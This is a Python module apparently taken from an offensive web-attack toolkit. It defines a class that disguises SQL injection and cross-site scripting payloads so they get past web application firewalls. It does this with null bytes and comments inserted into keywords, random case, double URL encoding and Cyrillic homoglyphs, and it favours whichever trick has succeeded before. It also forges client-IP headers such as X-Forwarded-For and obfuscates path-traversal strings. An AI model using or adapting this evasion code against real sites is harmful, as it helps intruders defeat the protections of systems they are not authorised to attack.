"""
WAF Evasion - Professional-grade WAF bypass techniques
"""
import random
import urllib.parse
from typing import Dict, List, Optional

class WAFEvasion:
    def __init__(self, technique: str = "adaptive"):
        """
        technique: adaptive, null_encoding, case_randomization, comment_injection
        """
        self.technique = technique
        self.blocked_patterns: List[str] = []
        self.successful_techniques: Dict[str, int] = {}
        
    def evade_payload(self, payload: str, param_type: str = "string") -> str:
        """
        Apply evasion techniques to payload
        """
        techniques = [
            self._null_byte_encoding,
            self._case_randomization,
            self._comment_injection,
            self._encoding_obfuscation,
            self._unicode_normalization,
        ]
        
        if self.technique == "adaptive":
            # Choose technique based on success rate
            technique = random.choices(
                techniques,
                weights=[self.successful_techniques.get(t.__name__, 1) for t in techniques]
            )[0]
        else:
            technique_map = {
                "null_encoding": self._null_byte_encoding,
                "case_randomization": self._case_randomization,
                "comment_injection": self._comment_injection,
            }
            technique = technique_map.get(self.technique, self._case_randomization)
        
        result = technique(payload, param_type)
        return result
    
    def _null_byte_encoding(self, payload: str, param_type: str) -> str:
        """Split blocked words with null bytes"""
        blocked = ['union', 'select', 'from', 'where', 'script', 'alert', 'onerror']
        result = payload
        for word in blocked:
            if word.lower() in result.lower():
                obfuscated = word[0] + '%00' + word[1:]
                result = result.replace(word, obfuscated)
        return result
    
    def _case_randomization(self, payload: str, param_type: str) -> str:
        """Randomize character case"""
        result = []
        for char in payload:
            if char.isalpha() and random.random() > 0.5:
                result.append(char.swapcase())
            else:
                result.append(char)
        return ''.join(result)
    
    def _comment_injection(self, payload: str, param_type: str) -> str:
        """Inject SQL/JS comments inside blocked words"""
        if param_type == "sql":
            blocked = ['union', 'select', 'from']
            result = payload
            for word in blocked:
                if word in result.lower():
                    obfuscated = word[:2] + '/**/' + word[2:]
                    result = result.replace(word, obfuscated)
            return result
        else:
            return payload.replace('script', 'scri/**/pt')
    
    def _encoding_obfuscation(self, payload: str, param_type: str) -> str:
        """Multi-layer URL encoding"""
        once = urllib.parse.quote(payload)
        twice = urllib.parse.quote(once)
        return twice if random.random() > 0.5 else once
    
    def _unicode_normalization(self, payload: str, param_type: str) -> str:
        """Use Unicode similar characters"""
        homoglyphs = {
            'a': 'а',  # Cyrillic а (U+0430)
            'e': 'е',  # Cyrillic е (U+0435)
            'o': 'о',  # Cyrillic о (U+043E)
            'p': 'р',  # Cyrillic р (U+0440)
            'c': 'с',  # Cyrillic с (U+0441)
        }
        result = []
        for char in payload:
            if char in homoglyphs and random.random() > 0.7:
                result.append(homoglyphs[char])
            else:
                result.append(char)
        return ''.join(result)
    
    def generate_alternatives(self, payload: str, count: int = 3) -> List[str]:
        """Generate multiple payload alternatives"""
        alternatives = []
        techniques = [self._case_randomization, self._encoding_obfuscation, 
                     self._comment_injection, self._null_byte_encoding]
        
        for i in range(min(count, len(techniques))):
            alt = techniques[i](payload, "string")
            alternatives.append(alt)
        
        return alternatives
    
    def mark_success(self, technique: str):
        """Record successful technique"""
        self.successful_techniques[technique] = self.successful_techniques.get(technique, 0) + 1
    
    def get_headers_evasion(self) -> Dict[str, str]:
        """Additional headers for WAF evasion"""
        return {
            "X-Originating-IP": self._generate_ip(),
            "X-Forwarded-For": self._generate_ip(),
            "X-Remote-IP": self._generate_ip(),
            "X-Remote-Addr": self._generate_ip(),
            "X-Client-IP": self._generate_ip(),
            "X-Host": self._generate_ip(),
            "X-Forwarded-Host": self._generate_ip(),
        }
    
    def _generate_ip(self) -> str:
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def path_obfuscation(self, path: str) -> str:
        """Path obfuscation (path traversal evasion)"""
        techniques = [
            lambda p: p.replace("/", "/./"),
            lambda p: p.replace("/", "//"),
            lambda p: p + "/",
            lambda p: urllib.parse.quote(p, safe=''),
        ]
        return random.choice(techniques)(path)